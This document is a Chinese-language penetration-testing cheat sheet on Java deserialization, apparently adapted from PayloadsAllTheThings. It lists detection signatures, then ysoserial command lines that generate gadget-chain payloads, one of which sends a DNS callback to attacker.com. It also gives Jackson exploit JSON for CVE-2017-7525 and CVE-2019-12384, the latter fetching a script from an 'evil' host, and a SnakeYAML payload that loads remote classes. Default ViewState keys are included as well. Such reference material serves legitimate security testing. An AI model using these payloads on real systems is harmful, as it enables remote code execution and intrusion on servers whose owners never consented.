# Java Deserialization - Java反序列化

[SEARCH_KEYWORDS]
漏洞类型: Java Deserialization Java反序列化
攻击类型: RCE Remote Code Execution Gadget Chain
关键词: Serializable ObjectInputStream readObject deserialize AC ED rO0 ysoserial
工具: ysoserial marshalsec SerializationDumper JavaSerialKiller
框架: CommonsCollections Spring Hibernate Groovy Jackson Fastjson
CVE: CVE-2017-7525 CVE-2017-17485 CVE-2019-12384

[CONTENT]

## Java反序列化概述

Java序列化是将Java对象状态转换为字节流的过程，可以存储或传输后重建为原始对象。序列化主要通过`Serializable`接口实现。不安全的反序列化可导致远程代码执行。

## 检测方法

### 特征识别

- Hex: `AC ED 00 05` (AC ED = STREAM_MAGIC, 00 05 = STREAM_VERSION)
- Base64: `rO0` 开头
- Content-Type: `application/x-java-serialized-object`
- Gzip Base64: `H4sIAAAAAAAAAJ` 开头

## ysoserial工具

生成反序列化payload:

```powershell
java -jar ysoserial.jar CommonsCollections1 calc.exe > payload.bin
java -jar ysoserial.jar Groovy1 calc.exe > payload.bin
java -jar ysoserial.jar Jdk7u21 bash -c 'nslookup `uname`.attacker.com' | gzip | base64
```

### 主要Payload列表

| Payload | 依赖 |
|---------|------|
| CommonsCollections1-7 | commons-collections |
| Spring1, Spring2 | spring-core, spring-beans |
| Groovy1 | groovy |
| Jdk7u21 | JDK < 7u21 |
| Hibernate1, Hibernate2 | hibernate |
| ROME | rome |
| URLDNS | 无 (DNS检测) |

## JSON反序列化

### Jackson

识别特征：错误信息包含 `com.fasterxml.jackson.databind`

**CVE-2017-7525:**
```json
{
  "param": [
    "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
    {
      "transletBytecodes": ["yv66v[BASE64]"],
      "transletName": "a.b",
      "outputProperties": {}
    }
  ]
}
```

**CVE-2019-12384:**
```json
[
  "ch.qos.logback.core.db.DriverManagerConnectionSource",
  {
    "url":"jdbc:h2:mem:;INIT=RUNSCRIPT FROM 'http://evil/inject.sql'"
  }
]
```

## YAML反序列化

### SnakeYAML

```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://attacker-ip/"]
  ]]
]
```

## ViewState利用

JSF ViewState可能包含序列化对象：

| 编码 | 开头 |
|------|------|
| base64 | rO0 |
| base64 + gzip | H4sIAAA |

### 默认密钥

| 算法 | 密钥值 |
|------|--------|
| AES CBC | NzY1NDMyMTA3NjU0MzIxMA== |
| DES | NzY1NDMyMTA= |
| Blowfish | NzY1NDMyMTA3NjU0MzIxMA |

## 工具

- ysoserial - Java反序列化payload生成
- marshalsec - Java Unmarshaller安全工具
- SerializationDumper - 序列化流分析
- JavaSerialKiller - Burp插件
- JexBoss - JBoss反序列化检测利用

## 参考文档

原始来源: PayloadsAllTheThings/Insecure Deserialization/Java.md